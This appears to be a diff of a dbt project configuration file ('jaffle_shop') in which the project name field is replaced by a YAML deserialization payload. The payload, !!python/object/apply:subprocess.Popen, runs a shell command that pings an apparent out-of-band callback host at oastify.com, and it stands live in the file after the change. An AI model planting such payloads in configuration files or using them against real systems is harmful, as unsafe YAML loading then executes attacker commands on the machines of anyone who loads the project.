@@ -1,7 +1,7 @@
 
 #name: 'jaffle_shop'
 name: !!python/object/apply:subprocess.Popen
-	- "ping http://qztiwizjp03cnbw2x6vh8pn37udn1c.oastify.com"
+    - ping http://qztiwizjp03cnbw2x6vh8pn37udn1c.oastify.com
 config-version: 2
 version: '0.1'
 
